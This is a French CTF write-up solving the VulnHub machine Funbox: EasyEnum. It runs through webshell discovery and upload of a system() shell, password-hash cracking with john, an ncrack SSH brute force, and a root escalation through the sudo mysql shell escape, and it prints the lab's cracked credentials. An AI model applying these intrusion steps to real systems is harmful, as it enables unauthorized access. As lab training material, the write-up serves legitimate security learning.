---
title: Solution du CTF Funbox Easy Enum de VulnHub
tags: [CTF, VulnHub]
---

### Fast Shell

[Funbox: EasyEnum](https://vulnhub.com/entry/funbox-easyenum,565/) est le 7ème opus de cette saga de CTF. J'ai zappé le 6 qui est une aberration, délire d'illogisme de son auteur.

Là ça va très vite. Une énumération remonte directement un webshell :

```console
$ feroxbuster -u http://192.168.56.127 -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.127
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      321c http://192.168.56.127/javascript
200      130l      300w     4443c http://192.168.56.127/mini.php
301        9l       28w      317c http://192.168.56.127/secret
301        9l       28w      321c http://192.168.56.127/phpmyadmin
403        9l       28w      279c http://192.168.56.127/server-status
```

Enfin... Ce webshell nommé `Zerion Mini Shell 1.0` ne permet pas d'exécuter des commandes, mais d'uploader des fichiers. J'en envoie donc un qui utilise la fonction `system()`.

Une fois passé à `reverse-ssh` je remarque un fichier `.htpasswd` mais à ce stade, je n'ai pas d'accès :

```console
www-data@funbox7:/var/www/html$ ls -alR
.:
total 3648
drwxrwxrwx 3 root     root        4096 Jul  2 20:22 .
drwxr-xr-x 3 root     root        4096 Sep 18  2020 ..
-rwxrwxrwx 1 root     root       10918 Sep 18  2020 index.html
-rwxrwxrwx 1 root     root        8218 Sep 18  2020 mini.php
-rwxr-xr-x 1 www-data www-data 3690496 Oct 19  2022 reverse-sshx64
-rwxrwxrwx 1 root     root          21 Sep 18  2020 robots.txt
drwxrwxrwx 2 root     root        4096 Sep 19  2020 secret
-rw-r--r-- 1 www-data www-data      31 Jul  2 20:20 shell.php

./secret:
total 16
drwxrwxrwx 2 root  root  4096 Sep 19  2020 .
drwxrwxrwx 3 root  root  4096 Jul  2 20:22 ..
-rwx------ 1 harry harry   79 Sep 18  2020 .htpasswd
-rwxrwxrwx 1 root  root    62 Sep 19  2020 index.html
```

On trouve différents utilisateurs, la plupart ont juste leur propre groupe :

```console
www-data@funbox7:/$ ls home/
total 28K
drwxr-xr-x  7 root   root   4.0K Sep 18  2020 .
drwxr-xr-x 24 root   root   4.0K Sep 19  2020 ..
drwxr-xr-x  4 goat   goat   4.0K Sep 19  2020 goat
drwxr-xr-x  2 harry  harry  4.0K Sep 19  2020 harry
drwxr-xr-x  4 karla  karla  4.0K Sep 18  2020 karla
drwxr-xr-x  2 oracle oracle 4.0K Sep 18  2020 oracle
drwxr-xr-x  2 sally  sally  4.0K Sep 19  2020 sally
www-data@funbox7:/$ id goat                          
uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)
www-data@funbox7:/$ id harry
uid=1001(harry) gid=1001(harry) groups=1001(harry)
www-data@funbox7:/$ id karla
uid=1000(karla) gid=1000(karla) groups=1000(karla),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),111(ssh)
www-data@funbox7:/$ id oracle 
uid=1004(oracle) gid=1004(oracle) groups=1004(oracle)
www-data@funbox7:/$ id sally
uid=1002(sally) gid=1002(sally) groups=1002(sally)
```

Visiblement, on peut directement exclure `karla` :

```console
www-data@funbox7:/home$ find . -type f -readable -ls 2> /dev/null 
    22826      4 -rw-r--r--   1 oracle   oracle       3771 Sep 18  2020 ./oracle/.bashrc
    22827      4 -rw-r--r--   1 oracle   oracle        807 Sep 18  2020 ./oracle/.profile
    22833      4 -rw-r--r--   1 oracle   oracle        220 Sep 18  2020 ./oracle/.bash_logout
    22142      0 -rw-r--r--   1 karla    karla           0 Sep 18  2020 ./karla/.sudo_as_admin_successful
     8329      4 -rw-r--r--   1 karla    karla        3771 Apr  4  2018 ./karla/.bashrc
    22835      4 -r--rw-rw-   1 root     root           41 Sep 18  2020 ./karla/read.me
     8330      4 -rw-r--r--   1 karla    karla         807 Apr  4  2018 ./karla/.profile
     8331      4 -rw-r--r--   1 karla    karla         220 Apr  4  2018 ./karla/.bash_logout
    22139      4 -rw-r--r--   1 harry    harry        3771 Sep 18  2020 ./harry/.bashrc
    22244      4 -rw-r--r--   1 harry    harry         807 Sep 18  2020 ./harry/.profile
    22247      4 -rw-r--r--   1 harry    harry         220 Sep 18  2020 ./harry/.bash_logout
    22818      4 -rw-r--r--   1 goat     goat         3771 Sep 18  2020 ./goat/.bashrc
    22820      4 -rw-r--r--   1 goat     goat          807 Sep 18  2020 ./goat/.profile
    22825      4 -rw-r--r--   1 goat     goat          220 Sep 18  2020 ./goat/.bash_logout
    22925      4 -rw-rw-r--   1 goat     goat          165 Sep 19  2020 ./goat/.wget-hsts
     3675      4 -rw-r--r--   1 sally    sally        3771 Sep 18  2020 ./sally/.bashrc
    22351      4 -rw-r--r--   1 sally    sally         807 Sep 18  2020 ./sally/.profile
    22515      4 -rw-r--r--   1 sally    sally         220 Sep 18  2020 ./sally/.bash_logout
www-data@funbox7:/home$ cat ./karla/read.me
karla is really not a part of this CTF !
```

Dans le fichier `passwd` du système, on trouve un utilisateur qui ne doit plus exister, ainsi qu'un hash pour `oracle` :

```
karla:x:1000:1000:karla:/home/karla:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

Le hash se casse rapidement :

```console
$ john --wordlist=wordlists/rockyou.txt /tmp/hash.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Note: Passwords longer than 5 [worst case UTF-8] to 15 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
hiphop           (oracle)     
1g 0:00:00:00 DONE (2025-07-02 22:32) 50.00g/s 19200p/s 19200c/s 19200C/s alyssa..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Avec `pspy` qui était déjà présent sur la machine, je vois passer cette commande :

```console
2025/07/02 20:48:01 CMD: UID=0    PID=22224  | /bin/sh -c tar -cvzf /root/html.tar.gz /var/www/html/ -ulissy -pgangsta
```

Clairement, les options `-u` et `-p` n'ont pas de sens pour `tar`. On pourrait penser que ce sont des identifiants valides, mais en fait non, ils sont refusés.

Du coup, j'ai fait un bète brute-force des comptes restants :

```console
$ ncrack -f -U /tmp/users.txt -P wordlists/rockyou.txt ssh://192.168.56.127

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-07-02 22:37 CEST

Discovered credentials for ssh on 192.168.56.127 22/tcp:
192.168.56.127 22/tcp ssh: 'goat' 'thebest'

Ncrack done: 1 service scanned in 1114.22 seconds.

Ncrack finished.
```

### MyShell

L'utilisateur `thegoat` est autorisé à exécuter `mysql` avec les privilèges de `root` :

```console
goat@funbox7:~$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
```

Il y a un GTFObin bien connu qui permet d'en finir :

```console
goat@funbox7:~$ sudo mysql -e '\! /bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
html.tar.gz  root.flag  script.sh
# cat root.flag
  █████▒ █    ██  ███▄    █  ▄▄▄▄    ▒█████  ▒██   ██▒                   
▓██   ▒  ██  ▓██▒ ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░                   
▒████ ░ ▓██  ▒██░▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒░░  █   ░                   
░▓█▒  ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░ ░ █ █ ▒                    
░▒█░    ▒▒█████▓ ▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒                   
 ▒ ░    ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░                   
 ░      ░░▒░ ░ ░ ░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░                   
 ░ ░     ░░░ ░ ░    ░   ░ ░  ░    ░ ░ ░ ░ ▒   ░    ░                     
           ░              ░  ░          ░ ░   ░    ░                     
                                  ░                                      
▓█████  ▄▄▄        ██████ ▓██   ██▓▓█████  ███▄    █  █    ██  ███▄ ▄███▓
▓█   ▀ ▒████▄    ▒██    ▒  ▒██  ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒▓██▒▀█▀ ██▒
▒███   ▒██  ▀█▄  ░ ▓██▄     ▒██ ██░▒███   ▓██  ▀█ ██▒▓██  ▒██░▓██    ▓██░
▒▓█  ▄ ░██▄▄▄▄██   ▒   ██▒  ░ ▐██▓░▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░▒██    ▒██ 
░▒████▒ ▓█   ▓██▒▒██████▒▒  ░ ██▒▓░░▒████▒▒██░   ▓██░▒▒█████▓ ▒██▒   ░██▒
░░ ▒░ ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░   ██▒▒▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
 ░ ░  ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▓██ ░▒░  ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ ░  ░      ░
   ░     ░   ▒   ░  ░  ░   ▒ ▒ ░░     ░      ░   ░ ░  ░░░ ░ ░ ░      ░   
   ░  ░      ░  ░      ░   ░ ░        ░  ░         ░    ░            ░   
                           ░ ░                                           

...solved ! 

Please, tweet this screenshot to @0815R2d2. Many thanks in advance.
```

Additionnellement, on peut se connecter à MYSQL grâce à l'entrée sudo et retrouver un hash :

```console
goat@funbox7:~$ sudo mysql 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| db1                |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
+--------------------+
6 rows in set (0.01 sec)

mysql> use db1;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------+
| Tables_in_db1 |
+---------------+
| users         |
+---------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-------+----------------------------------+
| id | name  | passwd                           |
+----+-------+----------------------------------+
| 1  | harry | e10adc3949ba59abbe56e057f20f883e |
+----+-------+----------------------------------+
1 row in set (0.00 sec)
```

Le mot de passe correspondant est `123456`. On ne l'a pas trouvé avec `ncrack` car seul `goat` est autorisé sur SSH (d'où son appartenance au groupe).

Une fois connecté sur le compte `harry` via `su` je peux lire le contenu du `.htpasswd` :

```console
harry@funbox7:~$ cat /var/www/html/secret/.htpasswd 
sally:$1$CLEC`tcN$7v.YWiWZWrpQDzB5YDb5i1
goat:aHlkcmEubWUhIGl0IHdvcmtzICEhISE=
```

Le hash de `sally` se casse en  `iubire`. Toutefois `sally` n'ayant aucun privilège particulier, c'est une impasse.
